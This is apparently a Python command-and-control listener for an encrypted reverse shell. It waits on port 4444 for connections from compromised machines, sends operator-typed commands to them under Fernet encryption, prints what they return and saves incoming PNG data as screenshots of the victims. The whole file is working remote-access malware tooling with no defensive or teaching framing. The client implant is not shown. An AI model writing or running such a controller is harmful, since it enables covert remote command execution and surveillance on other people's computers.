import socket
from cryptography.fernet import Fernet
import threading
import struct

# Key management
KEY_FILE = "secret.key"

try:
    with open(KEY_FILE, "rb") as f:
        key = f.read()
except FileNotFoundError:
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)

fernet = Fernet(key)
print(f"AES Key: {key.decode()}")

def send_data(s, fernet, data):
    try:
        encrypted_data = fernet.encrypt(data)
        s.sendall(struct.pack('<I', len(encrypted_data)))
        s.sendall(encrypted_data)
    except (socket.error, BrokenPipeError, ConnectionResetError):
        pass

def recv_data(s, fernet):
    try:
        packed_len = s.recv(4)
        if not packed_len:
            return None
        msg_len = struct.unpack('<I', packed_len)[0]

        full_msg = b''
        while len(full_msg) < msg_len:
            chunk = s.recv(msg_len - len(full_msg))
            if not chunk:
                return None
            full_msg += chunk
        
        return fernet.decrypt(full_msg)
    except (socket.error, struct.error, BrokenPipeError, ConnectionResetError):
        return None

def handle_client(client_socket, addr):
    try:
        # Send a Windows-compatible initial command
        initial_cmd = "cd"
        send_data(client_socket, fernet, initial_cmd.encode())

        while True:
            # Receive the output from the last command
            data = recv_data(client_socket, fernet)
            if not data:
                print(f"Connection closed by {addr}")
                break

            # Process and display the data
            if data.startswith(b"iVBORw0KGgo"):  # PNG magic bytes
                with open(f"screenshot_{addr[0]}.png", "wb") as f:
                    f.write(data)
                print(f"Screenshot saved as screenshot_{addr[0]}.png")
            else:
                print(data.decode(errors='ignore'), end='')

            # Get the next command from the user and send it
            cmd = input(f"Shell [{addr[0]}]> ")
            if not cmd.strip():
                # Send a harmless command to keep the prompt moving
                send_data(client_socket, fernet, b'echo.')
                continue
            if cmd.lower() == "exit":
                send_data(client_socket, fernet, b"exit")
                break
            send_data(client_socket, fernet, cmd.encode())
    except (ConnectionResetError, BrokenPipeError):
        print(f"Connection to {addr} lost.")
    except Exception as e:
        print(f"Error with {addr}: {e}")
    finally:
        client_socket.close()

def start_listener(host="0.0.0.0", port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"Listening on {host}:{port}")
    
    while True:
        client_socket, addr = server.accept()
        print(f"Connection from {addr}")
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

if __name__ == "__main__":
    start_listener()
